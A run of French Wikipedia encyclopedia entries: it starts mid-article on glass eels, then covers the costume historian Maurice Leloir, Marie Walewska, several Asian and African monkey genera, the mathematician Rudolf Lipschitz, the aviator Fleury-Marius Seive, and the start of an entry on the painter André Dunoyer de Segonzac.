L'industrie alimentaire a amélioré peu à peu les qualités et la ressemblance, et depuis longtemps les succédanés qui imitent les couleurs grisâtres et les yeux de la civelle originale sont majoritaires.
Festivités.
Il existe une fête des civelles qui a lieu fin mars à Indre et est devenue depuis deux ans la Fête de la Loire, en raison de la rareté de la civelle.

</doc>
<doc id="249030" url="https://fr.wikipedia.org/wiki?curid=249030" title="Maurice Leloir">
Maurice Leloir

Maurice Leloir, né le à Paris où il est mort le , est un peintre aquarelliste, dessinateur, graveur, écrivain et collectionneur français.
Biographie.
Fils et élève du peintre Auguste Leloir et de l'aquarelliste Héloïse Suzanne Colin (fille du peintre Alexandre Colin), Maurice Leloir est entouré d’artistes, élevé par une mère et des tantes connues pour leur spécialité en dessins de mode. Auprès de sa famille, il évolue dans le milieu théâtral et se découvre une passion pour les costumes, notamment ancien avec l’illustration d’ouvrages classiques. Les leçons de son père, prix de Rome, et de son frère Alexandre-Louis Leloir (1843-1884), premier second prix de Rome en 1860 et illustrateur reconnu, contribuèrent à lui donner précision archéologique et connaissances historiques, soutenues par des études classiques suivies à Sainte-Barbe. Ainsi, sur les traces de son frère aîné, Maurice Leloir entreprend des études aux Beaux-Arts, mais elles sont interrompues par la guerre franco-allemande de 1870.
Carrière artistique.
Il expose des peintures et des aquarelles à partir de 1876 au Salon de Paris, puis au Salon des artistes français dont il devient sociétaire. Il participe avec de nombreux autres peintres à l'École de Crozant dans les vallées creusoises. De 1876 à 1894, il expose des scènes familières - ses neveux dans "Les Marionnettes" - ou déjà des épisodes historiques : "Le Dernier Voyage de Voltaire", lors du centenaire de 1878, ou les "Dragonnades au Maupuy" en 1890. Puis, Maurice Leloir semble travailler dans l’ombre de son frère jusqu’à son décès en 1884. Il le seconde au sein de la Société des Aquarellistes français fondée le 18 novembre 1878. Secrétaire puis président, il a la charge de cette société jusqu’à sa disparition en 1935 par vieillissement de ses membres et de son activité. 
Autour des années 1890, Maurice Leloir et ses élèves inondent le marché du livre d'images, inspirées de photographies, représentant avec exactitude les costumes et les attitudes du passé, très appréciées des bibliophiles. À cette période, les actrices et les mondaines se font d’ailleurs tirer le portrait en habits historiques allant du au siècle, les couturiers se veulent peintres et les peintres couturiers. Par ailleurs, la présence de costumes chez les peintres est une vieille tradition inséparable de leur travail. C’est aussi une des préoccupations majeures des acteurs et décorateurs de théâtre. Il s'impose comme un illustrateur prolifique d'éventails, de revues et de livres, notamment pour enfants comme le "Richelieu" de Théodore Cahu. En 1884, Guy de Maupassant lui dédie d'ailleurs une nouvelle, intitulée "Idylle". Maurice Leloir est également un artiste collaborateur. Il collabore longtemps avec Henri Mathieu, costumier de l’Opéra-comique, ou bien avec Henri-Gabriel Ibels, décorateur au Théâtre de l'Odéon pour André Antoine.
Collectionneur, expert et Société de l'histoire du costume.
Lors de l'Exposition Universelle de 1900, le musée rétrospectif est élaboré sous la direction d'une commission présidée par le peintre Georges Cain, conservateur en chef au musée Carnavalet depuis 1898. Avec les classes 85 et 86, il consacre une place importante aux costumes, aux habits d'époque et aux accessoires de mode. Ainsi, beaucoup de collectionneurs sont sollicités, parmi lesquels on retrouve Maurice Leloir. Dans son introduction, Georges Cain note d'ailleurs « son incomparable collection de vêtements de femme Louis XV et Louis XVI ». En effet, Maurice Leloir œuvre également pour l'histoire du costume, en tant que collectionneur et expert. En plus des vêtements et de son activité d'expert auprès de costumiers, il possédait une véritable collection de photographies d'acteurs vêtus de costumes du au siècles allemands, sortis des fonds de théâtre. À l'époque, collectionneurs et artistes se constituaient à grands frais de portefeuilles de photographies de portraits ou de costumes, conservés dans les musées européens.
Fondation de la Société de l'histoire du costume.
Fin décembre 1906, collectionneurs, artistes peintres et représentants d'institutions se réunirent pour créer la Société de l'histoire du costume. Le , il fonde la Société de l’histoire du costume (SHC), aux côtés d'Edouard Detaille, peintre et membre de l'Institut de France, de Maurice Maindron ou encore du couturier Jacques Doucet, qui siège également au conseil du Musée des Arts décoratifs, inauguré quelques années auparavant. La mission principale de cette société est l'étude du costume pour les peintres et costumiers de théâtre, et vise déjà la création d'un musée parisien spécialisé. Armes et costumes régionaux, reconstitutions, patrons et études des textes y ont leur place. À cet effet, elle achète ou perçoit des dons de costumes, notamment de la part de costumiers et d'artisans, afin de se constituer une collection propre. Cette activité de l'association donne lieu à la publication d'une revue par l'éditeur Leroy.
Rapidement, la Société de l'histoire du costume prend en ampleur et compte jusqu'à 150 membres en 1909. Cette même année, dans le but de sensibiliser les institutions et le public, l'association organise une exposition sur les « Costumes anciens » au Pavillon de Marsan, ce qui participe sans doute à ce que la Société de l'histoire du costume soit reconnue d'utilité publique trois ans plus tard. Inauguré le 23 janvier 1920 en présence du président Raymond Poincaré, la Société de l'histoire du costume crée un premier musée dans l'ancien atelier du peintre Raimundo de Madraz, illustrant l'évolution de la mode française du au siècle avec des mannequins en cire aux attitudes naturelles, créés par le peintre-dessinateur Félix Fournery. 
Donation de la collection de la Société de l'histoire du costume.
Pour autant, entre le décès d'Edouard Detaille en décembre 1912, la Première Guerre mondiale et la disparition de nombreux sociétaires, mais aussi le coût important des expositions, Maurice Leloir doit prendre une décision drastique. Le , la Société de l’histoire du costume fait don de sa collection à la Ville de Paris. La collection regroupe près d'un millier de vêtements du et du siècle, essentiellement constituée de pièces masculines, mais aussi de quelques exemples féminins notables, représentatifs du style Louis XV. Cette sélection témoigne d'un certain goût des collectionneurs contemporains. La genèse du fond remonte peut-être à Alexandre-Marie Colin, portraitiste, peintre d'histoire et illustrateur, mais également grand-père maternel de Maurice Leloir. Alexandre-Louis Leloir était lui aussi collectionneur : il achetait ses costumes du siècle à l’antiquaire Pickert de Nuremberg. Jusqu'à la donation, la collection est vivante et n'est pas figée dans un statut patrimonial. Les vêtements circulent probablement entre les collectionneurs et les artistes, expliquant certains détails et arrangements curieux qui sont probablement des remaniements pour servir de modèle à des œuvres picturales. La Société de l'histoire de costume travaille également à la reconstitution à l'identique de costumes anciens, pouvant être utilisés parallèlement à des pièces authentiques.
Cette initiative participe à l'ouverture de six nouvelles salles au musée Carnavalet. Inaugurées en 1924 sous la direction de François Boucher, elles sont consacrées au « Costume parisien, du siècle au Second Empire ». La volonté d'y intégrer un parcours sur les costumes apparaît dès 1898 avec la présentation de costumes Louis XV, Louis XVI, de la Révolution, du Directoire et du Premier Empire. En reconnaissance, la ville de Paris permet à la Société de l'histoire du costume de continuer à gérer les collections, mais la direction du musée et les ambitions des sociétaires divergent rapidement. 
En 1928, Maurice Leloir se rapproche des écoles professionnelles et de la Chambre syndicale de la couture, et il participe à la création de l'Association du Musée et de l'Académie du Costume. il continue d'accroître la collection du musée Carnavalet et de chercher un lieu adéquat pour un futur musée du costume. 
La collection du Palais Galliera.
Ainsi, les actions autour de la création de la Société de l'histoire du costume sont à l'origine du Musée du Costume de la ville de Paris. Depuis 1895, année de l'inauguration du Palais Galliera en tant que musée d'Art industriel, le public parisien peut découvrir l'art textile et des accessoires de mode dans un contexte muséal. Le musée du Costume, anciennement Palais Galliera, est d'emblée pensé comme une entreprise pérenne, avec une rotation régulière des pièces pour les préserver et attirer un public varié. En 1937 et en 1938, Maurice Leloir en profite pour organiser deux expositions marquantes au musée Galliera. En effet, dans le cadre de l'Exposition universelle de 1937, il présente l'exposition « Cent ans de costume parisien » regroupant costumes, accessoires, mais aussi tableaux, dessins et gravures. Cette manifestation rencontre un grand succès et en 1938, le Palais Galliera souhaite répéter l'expérience avec « Costumes d'autrefois. , , siècles ». L'exposition permet de renouveler les dispositifs de monstration. Maurice Leloir y aborde notamment les questions pratiques relatives à la reconstitution des pièces anciennes, interrogeant sa rigueur scientifique et son usage à l'avenir, et réfléchit au sujet de la présentation des mannequins. Maurice Leloir se positionne alors en muséographe où il établit des concepts sur l’histoire des objets. 
Malheureusement, lorsque la Seconde Guerre mondiale éclate, le projet de Musée du Costume est à nouveau suspendu. Décédé en 1940, Maurice Leloir n'en verra jamais l'inauguration en 1956, sous la direction de Madeleine Delpierre (1920-1994), dont la ténacité fut égale à celle de Leloir. À l’entrée de Palais Galliera, dès l'ouverture, la ville rendait hommage à son fondateur par un grand médaillon commémoratif sculpté par Henry Bouchard, accroché dans la première salle. Il prend d'abord place au rez-de-chaussée du musée d'Art moderne de la Ville de Paris avant de fermer ses portes en 1971, et de réintégrer le musée Carnavalet. C'est en 1977, que le musée du Costume, souhaité par Maurice Leloir et ses sociétaires, finit par prendre place au sein du Palais Galliera. À ce jour, la collection de la Société de l'histoire du costume représente 40% du département siècle du musée Galliera. 
Œuvre.
Maurice Leloir réalise quelques tableaux dont une huile sur bois, "La maison Fournaise," exposée au musée Fournaise de la ville de Chatou et volée en 1999.
Il écrit "Une femme de qualité" (Joyant Manzi &amp; Cie, Paris, 1878), une synthèse de son idéal artistique, illustrée de quatre vingt aquarelles.
À l'international, sa réputation dépasse les frontières. En 1928, Douglas Fairbanks lui demande de participer aux costumes et aux décors du film "Le Masque de fer, l"’adaptation cinématographique de son roman éponyme. Il est également considéré comme un grand pionnier de l’histoire du costume au Royaume-Uni.
En juin 1928, avec madame Brayer et Jacques Ruppert, il crée l’Association du "Musée et de l’Académie du Costume", et recommence sa quête d’un lieu pour les collections qu’il continue d’accroître pour le Musée Carnavalet à Paris.
Dans les années 1920, Maurice Leloir reprit le projet ancien du “Musée-dictionnaire” de Maindron, où il rédige, par la suite, une "Histoire du costume" ": de l'Antiquité à 1914""." Il y a entrepris la description de vêtements d'hommes, de femmes et d'enfants, ainsi que d'accessoires. Il travaille également à "Dictionnaire du costume et de ses accessoires, des armes et étoffes, des origines à nos jours," publié à titre posthume en 1951. Il s'agit de l'un des premiers ouvrages majeurs consacrés à la mode, avant la publication de François Boucher, "Histoire du costume en Occident" (1965). Il reste un ouvrage de référence sur le sujet encore aujourd'hui, regroupant une masse d'images avec des commentaires critiques.
Sa fille, Suzanne Leloir, le représente dans son atelier sur une toile conservée au musée Gallé-Juillet.

</doc>
<doc id="249032" url="https://fr.wikipedia.org/wiki?curid=249032" title="Marie Walewska">
Marie Walewska

Marie Walewska, née Łączyńska le à Kiernozia et morte le à Paris, est une noble polonaise connue pour avoir été « la femme polonaise » de Napoléon avec laquelle il a eu un fils, Alexandre Colonna Walewski.
Biographie.
Enfance.
Maria naît le à Brodno, village proche de Kiernozia au sein d'une famille de l'ancienne noblesse polonaise. Le père de Maria, Maciej Łączyński reprend le domaine familial lorsque son frère aîné décide d'entrer dans les ordres. En 1794, il participe à l'insurrection polonaise de Tadeusz Kościuszko contre la Russie impériale. Son échec en 1795 provoque le troisième et dernier partage de la Pologne entre les puissances voisines et la disparition du Royaume de la carte de l'Europe. Les terres de la famille font partie du territoire incorporé à la Prusse. Maciej Łączyński, blessé durant une des batailles, décède en .
La première enfance de Maria fut heureuse, bien que souvent solitaire. Après la mort de son père, son enfance est marquée par le précepteur engagé par sa mère Ewa. C'est un Français venu en Pologne sept ans plus tôt, Nicolas Chopin, le père du célèbre compositeur Frédéric. De 1795 à 1802, il éduque Teodor et Maria, puis les deux autres filles, Antonina et Emilia, avant d'entrer au service d'une famille amie des Łączyński, la famille Skarbek.
À cette époque, de nombreux jeunes gens quittent le pays pour s'engager dans les Légions polonaises formées à Mantoue sous le commandement du général Jan-Henryk Dąbrowski. C'est d'ailleurs le cas du frère aîné de Maria, Benedykt Łączyński qui deviendra général en 1804 (Teodor, deviendra colonel de l'armée française).
Un peu avant son quatorzième anniversaire, Maria part pour le couvent Notre-Dame-de-l'Assomption à Varsovie, où les jeunes filles de bonne famille sont envoyées pour y compléter leur éducation. « Marie est intelligente et studieuse, avec une douceur de caractère qui l'a fait aimer par tous ici » écrivait la supérieure à sa mère, Ewa Łączyńska, à la fin de la scolarité de la jeune fille. Maria était aussi devenue d'une grande beauté. Il n'y avait qu'une voie qui pouvait apporter à une fille fortune et honneur : un riche mariage avec un homme bien né.
Mariage.
Elle est mariée en 1804 - à 17 ans - au comte et chambellan Anastazy Walewski, un grand noble polonais quasi septuagénaire. La jeune femme rêve d'une Pologne libre, et « nourrit une haine virile du Russe qui occupe la Mazovie, où elle est née, à quelques lieues de Varsovie, mais aussi du Prussien et de l'Autrichien qui se sont partagé le reste du pays ». C'est en Pologne, en 1805, qu'elle donne naissance à son premier fils, Antoni.
Relation avec Napoléon.
À l'automne 1806, Napoléon occupe le territoire polonais. Les Polonais l'attendaient comme le champion de la liberté, qui devait libérer la Pologne. Les Walewski, eux aussi, voient en lui un libérateur, et s'installent à Varsovie pour mieux s'intégrer à l'enthousiasme ambiant. Maria s'abandonna à une fiévreuse agitation, travaillant avec les dames de Varsovie à organiser des hôpitaux, des ambulances, des stations de premier secours. Elle est également introduite dans la haute société, mais la vie mondaine l'intéresse peu.
C'est le , lors du passage de l'empereur au relais de poste de Błonie, sur la route de Varsovie, que Maria Walewska aurait rencontré Napoléon pour la première fois. Un bal organisé par Talleyrand, ministre français des relations extérieures, devait marquer à Varsovie l'ouverture du carnaval et constituer la plus brillante réception que la capitale dévastée eût vue depuis Stanislas-Auguste. Un bref paragraphe parut dans le journal officiel, la gazette de Varsovie : « Sa majesté l'Empereur a assisté à un bal chez le ministre des relations extérieures, le Prince de Bénévent, au cours duquel il a invité à une contredanse la femme du chambellan Anastazy Walewski. » À midi, le lendemain, une voiture s'arrêta devant l'hôtel des Walewski. Duroc, le grand maréchal du palais, en descendit, portant un gigantesque bouquet de fleurs et une lettre sur un épais parchemin, fermée du sceau vert impérial.
« Je n'ai vu que vous, je n'ai admiré que vous, je ne désire que vous. […] » « N ». Maria fit répondre à Duroc qu'il n'y aurait pas de réponse. D'autres lettres enflammées suivirent… Les allées et venues de Duroc allaient attirer l'attention, et nombre de gens venaient donner des conseils à Marie. Elle avait été distinguée par le destin. Elle avait été choisie pour sauver la Pologne. Le chef de famille Łączyński - soldat modèle de l'empereur - lui donnait sa bénédiction.
Elle finit par accepter (avec l'accord de son mari) de devenir sa maîtresse. L'« idylle » printanière du couple (d'avril à juin) dans le lointain château de Finckenstein est un moment unique et entièrement inattendu dans la vie de Napoléon, une période qui le vit déployer ce qu'un historien de cette période de sa vie appela une « énergie miraculeuse ». Pour Maria, la décision de rejoindre l'Empereur à Finckenstein était un acte de suprême courage et le risque couru énorme. Les deux amants sont très épris l'un de l'autre et l'empereur va dès lors organiser sa vie de façon à consacrer du temps à ses amours, chose qu'il n'avait pas faite depuis Joséphine de Beauharnais.
Dans l'intimité, Maria, avec son doux caractère polonais, ramène la conversation sur son idée fixe : la résurrection de la Pologne. Patiemment, Napoléon discute avec elle sans toutefois s'engager. Ses arguments sont toujours les mêmes : que les Polonais fassent preuve de cohésion, de maturité, qu'ils soutiennent militairement sa lutte contre l'Empire russe, et ils seront récompensés selon leurs mérites. Son obstination finira par aboutir : Napoléon crée en 1807 le Duché de Varsovie qui disparaîtra peu après la défaite de la campagne de Russie en 1812-1813. C'était en fait un compromis pour ne pas déplaire au tsar, mais une réponse terriblement faible à l'attente des Polonais dont des milliers de soldats étaient morts pour l'empereur.
Naissance d'Alexandre.
Le , à 4 heures de l'après-midi, Alexandre, comte Walewski, un bel enfant robuste, ouvre les yeux sur un monde où il allait connaître une carrière brillante et tumultueuse. « Je suis né au château Walewice en Pologne », écrira 35 années plus tard dans ses "Mémoires" le futur ministre des affaires étrangères de Napoléon III. Anastazy Walewski - âgé de 73 ans - le reconnaît déclarant qu'il est issu de son mariage avec Maria née Łączyńska - âgée de 23 ans -. Napoléon apprend la naissance de son fils au cours d'un voyage triomphal en Belgique avec sa jeune épouse (Marie-Louise d'Autriche). Il fait parvenir des dentelles de Bruxelles et francs en or pour Alexandre. Le , à Saint-Cloud, en présence de Maria, Napoléon signe un long document juridique garantissant l'avenir du jeune Alexandre . La dotation consistait en 60 fermes aux environs de Naples, d'un revenu annuel de francs . Les armoiries conférées par les lettres patentes en même temps que le titre de comte de l'Empire étaient un mélange des blasons Walewski et Łączyński .
Séparation et divorce.
D'après les règles de la communauté de biens de son mariage, les revenus de la dotation du jeune Alexandre, pendant sa minorité, couraient le risque d'être engloutis dans l'avalanche de dettes du vieux chambellan. Le , le couple passa un acte dans lequel Maria déclarait son intention de se séparer légalement de son mari et se chargeait d'assumer la responsabilité financière de ses deux fils (Antoni et Alexandre). La comtesse Walewska bénéficiait des dispositions récemment introduites par le Code Napoléon qui facilitait le divorce. Le le mariage était dissous - un temps étonnamment court pour qu'un tribunal rendît une décision. Si Maria était légalement libre, son éducation catholique comme la tradition la contraignirent, aussi longtemps que vécut le chambellan (2 ans et demi), à le considérer comme son mari.
Vie en France.
L'année 1813 trouve Maria de retour à Paris, installée rue de la Houssaye avec ses deux fils, son frère Teodor et sa sœur Antonina. Grâce à la généreuse dotation de Napoléon, la comtesse Walewska est une femme riche. Elle habite aussi de 1811 à 1812 à Boulogne-sur-Seine au 7, rue de Montmorency dans une maison qui porte encore son nom.
Maria et son fils Alexandre rendent visite à Napoléon en exil à l'île d'Elbe du au en compagnie d'Emilia et de Teodor, sœur et frère de Marie.
Second mariage.
Veuve en 1814 de son premier mari, elle consent à épouser le (Sainte-Gudule Bruxelles) 1816 le comte Philippe Antoine d'Ornano, cousin éloigné de Napoléon et général d'empire. En , Maria qui attendait un enfant décida de se rendre en Pologne pour consulter son vieil ami, éminent gynécologue, le Ciecierski. Il diagnostiqua une maladie des reins : toxémie aiguë aggravée par la grossesse. La fin de sa vie semble proche. Au cours de l'été, étendue sur une chaise longue dans le jardin de sa maison à Liège, la comtesse d'Ornano dicta à son secrétaire, ce qui est supposé être ses Mémoires. Sa liaison avec l'empereur y est décrite comme « un sacrifice fait à son pays ».
Mort.
À 7 heures du soir, le , plusieurs mois après un accouchement difficile, le cœur de Maria Walewska cessa de battre. Elle avait 31 ans et 4 jours. « Toute la maison était plongée dans un vrai désespoir, racontera Alexandre Walewski des années plus tard. […] Ma mère était l'une des femmes les plus remarquables qui eût existé. » 
Dans son testament, Maria exprima le désir que son cœur reste en France mais que son corps soit transporté en Pologne dans le caveau familial de Kiernozia. Conformément à ce vœu, une urne contenant son cœur repose aujourd'hui au cimetière du Père-Lachaise dans le caveau des d'Ornano (), portant la simple inscription : « Maria Walewska, comtesse d'Ornano […] » et le corps fut emmené en Pologne 4 mois plus tard.
Regards des contemporains.
Sous la plume de Madame de Kielmannsegge :
« J'eus peu de rapports avec Walewska (…) Elle n'était pas précisément grande, mais elle avait la taille bien prise, les cheveux blonds, le teint clair, la figure pleine, un sourire extrêmement agréable et un timbre de voix qui la rendait sympathique aussitôt qu'elle parlait ; modeste et sans prétention, très réservée dans ses gestes et toujours très simple dans sa toilette, elle avait comme femme tout ce qu'il faut pour plaire et être aimée. »
Napoléon évoquant Marie Walewska :
« Une femme charmante, un ange ! C'est bien d'elle qu'on peut dire que son âme est aussi belle que sa figure !… »
Postérité.
Filmographie.
En 1937, Greta Garbo interprète le rôle de Maria Walewska dans le film "Marie Walewska" ("Conquest", en anglais) qui retrace sa vie.
En 1984, Serge Lama sort l'album "", qui contient la chanson "Marie La Polonaise".
En 2002, Alexandra Maria Lara incarne Marie Walewska dans la mini-série TV historique "Napoléon".
Documentaire.
Marie Walewska fait partie des figures féminines traitées dans le cadre de l'émission "Secrets d'histoire", intitulée "Napoléon et les femmes" diffusée le sur France 2.

</doc>
<doc id="249033" url="https://fr.wikipedia.org/wiki?curid=249033" title="Presbytis">
Presbytis

Presbytis, le Presbythèque, est un genre de singes asiatiques de la famille des Cercopithecidae, qui sont présents sur diverses îles d'Asie du Sud-Est. La classification scientifique de ces primates a connu de nombreux changements depuis les années 1980 et est loin d'être consensuelle. Pour des raisons historiques, la plupart de ses membres est nommée semnopithèques, même si le genre « "Semnopithecus" » en a été séparé.
Classification.
Taxonomie.
La taxinomie de ce genre est très discutée, certains auteurs considérant notamment les espèces "Presbytis natunae", "Presbytis siamensis" et "Presbytis chrysomelas" comme de simples sous-espèces du Semnopithèque malais ("Presbytis femoralis").
Liste des espèces.
Selon la troisième édition de Mammal Species of the World de 2005 :

</doc>
<doc id="249034" url="https://fr.wikipedia.org/wiki?curid=249034" title="Rudolf Lipschitz">
Rudolf Lipschitz

Rudolf Otto Sigismund Lipschitz (1832-1903) est un mathématicien allemand.
Carrière universitaire.
Il étudia à l’université de Königsberg (1847-1849) où il devient membre du Corps Littuania, puis à l’Université de Berlin où il suivit les cours de Gustav Dirichlet et d’Ohm, soutenant sa thèse de doctorat en 1853. D’abord privat-docent de l’université de Berlin (1857), il fut recruté comme professeur surnuméraire de l’université de Breslau en 1862, avant de devenir professeur titulaire de l’université de Bonn en 1864, où il passera le reste de sa carrière. Il y supervise les premiers travaux de Felix Klein.
Œuvre scientifique.
Lipschitz a laissé son nom aux applications dont les variations sont contrôlées linéairement par celles de la variable (application lipschitzienne). En réalité, son travail s'étend sur des domaines aussi variés que la théorie des nombres, l'étude des algèbres involutives, l'analyse, la géométrie différentielle et la mécanique classique, en particulier la résolution des équations du mouvement dans le formalisme d'Hamilton-Jacobi. Son travail sur les équations différentielles vient préciser les résultats obtenus par Cauchy. Lipschitz a en outre donné un critère de convergence des développements en série de Fourier.

</doc>
<doc id="249035" url="https://fr.wikipedia.org/wiki?curid=249035" title="Procolobus">
Procolobus

Procolobus est un genre de mammifères primates de la famille des Cercopithecidae qui ne comprend plus qu'une seule espèce de colobes, le Colobe vert. 
Liste des espèces.
Selon :
Systématique.
Le nom valide complet (avec auteur) de ce taxon est "Procolobus" Rochebrune, 1877.
La classification scientifique de ces singes a évoluée : Groves (2005) ne conserve qu'une seule espèce dans ce genre et classe les autres dans le genre "Piliocolobus".
"Procolobus" a pour synonyme :

</doc>
<doc id="249036" url="https://fr.wikipedia.org/wiki?curid=249036" title="Rhinopithecus">
Rhinopithecus

Rhinopithecus (les rhinopithèques) est un genre de singes appartenant à la famille des Cercopithecidae. Il comprend toutes les espèces nommées « rhinopithèque » en français, sauf le Rhinopithèque à pieds noirs qui est classé dans le genre "Pygathrix". Ces singes, dont le nez semble avoir été amputé, vivent tous en Asie du Sud-Est. Grâce à sa fourrure, le rhinopithèque de Chine supporte des températures extrêmes. Dans les sociétés de rhinopithèques, les mères occupent un rang plus élevé que les femelles sans petit, et les mâles ayant plusieurs partenaires acquièrent un statut supérieur.
Classification scientifique.
Les rhinopithèques sont des singes exclusivement asiatiques très proches d'un point de vue morphologique et taxonomique des doucs (genre "Pygathrix").
Les taxinomistes ne sont d'ailleurs pas tous d'accord pour en faire un genre à part entière et le faible niveau de connaissance, tant des doucs que des rhinopithèques ne permet pas de pencher plus en faveur de l'une ou l'autre des argumentations. Le genre "Rhinopithecus" a été inclus dans "Pygathrix" par Groves (1970), Szalay &amp; Delson (1979) et McKenna &amp; Bell (1997), mais Jablonski &amp; (Peng 1993) et Groves (2001) ont finalement réhabilité ce genre et l'ont à nouveau distingué comme un genre à part.
Liste d'espèces.
Selon :
Caractéristiques du genre.
D'un point de vue pratique, les 5 espèces de rhinopithèques sont faciles à distinguer de toutes les autres espèces de singes par un trait anatomique unique, à savoir un appendice nasal réduit à sa plus simple expression, muni de deux immenses narines fendues de haut en bas qui donnent l'impression que le nez a été amputé. 
Ces espèces sont souvent montagnardes ce qui explique tant leur imposant pelage que leur surprenant régime alimentaire reposant à un fort pourcentage sur des lichens, des feuilles et des herbes. Toutes ces espèces sont menacées, sauf le rhinopithèque de Roxellane qui, un temps proche de l'extinction, a bénéficié indirectement des campagnes de protection du panda géant qui vit sur les mêmes terres que lui et dont l'habitat a été partiellement restauré ou préservé.
Leur longue queue leur sert à se stabiliser lors de leurs périlleuses acrobaties entre les arbres.
Le Rhinithecus est l'unique primate à savoir marcher debout dans la neige mis à part l'homme.
Reproduction.
C'est la femelle qui prend l'initiative de l'accouplement ; par des regards elle prend contact avec le mâle puis s'enfuit sur une courte distance ; parfois aussi elle lui présente ses parties génitales. Si le mâle montre de l'intérêt, ce qui n'arrive pas toujours, l'accouplement s'ensuit. Après une gestation d'environ 200 jours un petit (un seul la plupart du temps) vient au monde au printemps ou au début de l'été. Les jeunes atteignent leur maturité sexuelle entre cinq et sept ans. Sur la durée de l'allaitement ou l'espérance de vie on ne sait rien.

</doc>
<doc id="249037" url="https://fr.wikipedia.org/wiki?curid=249037" title="Fleury-Marius Seive">
Fleury-Marius Seive

Fleury-Marius Seive, né le dans le arrondissement de Lyon, ville où il est mort le dans le , est un aviateur, photographe, géographe et résistant français.
Biographie.
Première Guerre mondiale.
Le , il s'engage volontairement dans le d’infanterie, en garnison à Lyon. Il devient aspirant, . Puis sous-lieutenant en 1917. En 1918, il entre à l'École de l’air, puis à l'École militaire de Saint-Cyr de 1919 à 1920, promotion des Croix de guerre 1914-1918. Il est affecté à la base de Lyon-Bron, dans le d’aviation, en 1921. D’abord observateur, il est chargé ensuite de missions de photographies aériennes pour le service géographique de l’Armée, dans la région de Nîmes, en 1922. En 1924, il obtient le Brevet militaire de pilote.
Carrière de photographe et d'aviateur.
Il collabore avec des géographes intéressés par les possibilités de la photographie aérienne, notamment Raoul Blanchard, directeur de l’Institut de Géographie Alpine, l'ouvrage, "Les Alpes à vol d’oiseau", reçoit le Prix littéraire des Alpes françaises, et le professeur de géographie régionale à l’université de Lyon, André Cholley ("Atlas photographique du Rhône", 1932). Il est d'ailleurs membre de la Commission des études rhodaniennes dont André Cholley est le secrétaire général.
On lui doit les premiers plans photographiques aériens de Lyon.
Il obtient son Certificat d’aptitude aux fonctions de commandant d’avion en juillet 1936. Il se met à la disposition du service technique et des recherches scientifiques de l’Aéronautique en 1936. Après la déclaration de guerre, en 1939, le lieutenant-colonel Seive connaît plusieurs affectations. Il est directeur de la base aérienne de Lyon-Bron de 1941 à 1942. À la suite de l’invasion de la « zone libre », il demande son congé du personnel navigant.
Durant la Seconde Guerre mondiale.
Membre du réseau de Résistance Air, il est arrêté le et incarcéré à la prison Montluc. Transféré à Fresnes, il est finalement libéré. En septembre 1944, il réintègre l’Armée et est nommé commandant de la subdivision aérienne de Lyon. En 1945, il publieses souvenirs de prisonnier : "De Montluc à Fresnes". Il est mis en congé définitif du personnel navigant, avec le grade de Général de brigade aérienne du cadre de réserve, le .
Décès et inhumation.
Marius-Fleury Seive est enterré dans l'ancien cimetière de Villeurbanne.

</doc>
<doc id="249039" url="https://fr.wikipedia.org/wiki?curid=249039" title="Trachypithecus">
Trachypithecus

Trachypithecus est un genre de singes de la famille des Cercopithecidae, dont la classification est encore discutée, éventuellement répartis en deux sous-genres : Kasi et Trachypithecus. Ce genre regroupe des singes appelés semnopithèques, entelles ou langurs en français.
Liste de sous-genres et espèces.
Selon qui distingue deux sous-genres :
Selon :

</doc>
<doc id="249042" url="https://fr.wikipedia.org/wiki?curid=249042" title="Dépression mentale">
Dépression mentale



</doc>
<doc id="249043" url="https://fr.wikipedia.org/wiki?curid=249043" title="Semnopithecus">
Semnopithecus

 constitue un genre de mammifères primates asiatiques de la famille des qui rassemble des singes appelées semnopithèques, entelles ou langurs.
Classification.
La classification scientifique de ces singes est en cours de révision depuis 1979. Le genre a été considéré comme un sous-genre de "Presbytis" par Szalay and Delson (1979), puis séparé par Groves en 1989 tandis que les espèces ont été regroupées en une seule ("entellus") avant que Groves ne distingue sept espèces distinctes en 2001.
Espèce type : "Simia entellus" Dufresne, 1797 (syn. valide "Semnopithecus entellus") 
Liste des espèces.
Selon la troisième édition de Mammal Species of the World de 2005 :

</doc>
<doc id="249047" url="https://fr.wikipedia.org/wiki?curid=249047" title="André Dunoyer de Segonzac">
André Dunoyer de Segonzac

André Albert Marie Dunoyer de Segonzac, né le à Boussy-Saint-Antoine (Seine-et-Oise, aujourd'hui Essonne) et mort le à Paris, est un peintre, dessinateur, graveur et illustrateur français.
On retient qu'.
Biographie.
André Dunoyer de Segonzac naît le à Boussy-Saint-Antoine, du mariage de Louis Dunoyer de Segonzac (1843-1937), officier de marine, et Clémence Amélie Persil (1854-1918). Côté paternel, il est issu d'une famille de la noblesse française d'extraction (1558), originaire du Quercy.
Il a pour arrière-grand-père maternel Jean-Charles Persil qui fut garde des sceaux du roi Louis-Philippe Ier et qu'Honoré Daumier caricatura sous le sobriquet de "Père-Scie".
Jeunesse et formation.
Il passe la plus grande partie de sa jeunesse dans son village natal à propos duquel Jean Vallery-Radot restitue des réminiscences durables : . Il est du lycée Henri-IV à Paris où - cette vocation précoce décevra l'ambition parentale de le destiner à Saint-Cyr - et où il rencontre Gus Bofa qui restera un de ses proches.
En 1900, il est élève libre de l'École nationale supérieure des beaux-arts de Paris. En 1903, parallèlement à l'étude du malinké qui, à l'École nationale des langues orientales, lui vaudra une licence en dialectes soudanais, il entre dans l’atelier privé de Luc-Olivier Merson qu'il quitte, en mauvais termes avec ce maître, après son service militaire pour, en 1907, devenir à l'Académie Julian l'élève de Jean-Paul Laurens, puis dispose ensuite d'un atelier à l'Académie de la Palette à Montparnasse, où il reçoit les conseils de Georges Desvallières et Charles Guérin et où lui-même enseignera. Il fait la connaissance de Luc-Albert Moreau et de Jean-Louis Boussingault avec lequel il partage un atelier au 37, rue Saint-André-des-Arts. C'est aux côtés de ces deux derniers qu'il va . Ses premiers dessins sont publiés en 1908 dans "La Grande revue" et "Le Témoin", hebdomadaire créé par son ami Paul Iribe.
Le jeune peintre.
En 1908, il commence à exposer au Salon d'automne et au Salon des indépendants, avec Paul Signac et Maximilien Luce. Son installation d'alors avenue Sainte-Marie à Chaville (alors en Seine-et-Oise, aujourd'hui dans les Hauts-de-Seine), ville qu'il habitera jusqu'à sa mort, est liée à son attachement à la cité voisine de Versailles dont il évoque lui-même l'ancienneté : écrit-il pour souligner que, depuis l'âge de sept ans, il s'y rend chez un oncle conseiller d'État. C'est ainsi qu'il sera considéré que qui, cependant, continue de travailler dans son atelier parisien, au de la rue Bonaparte.
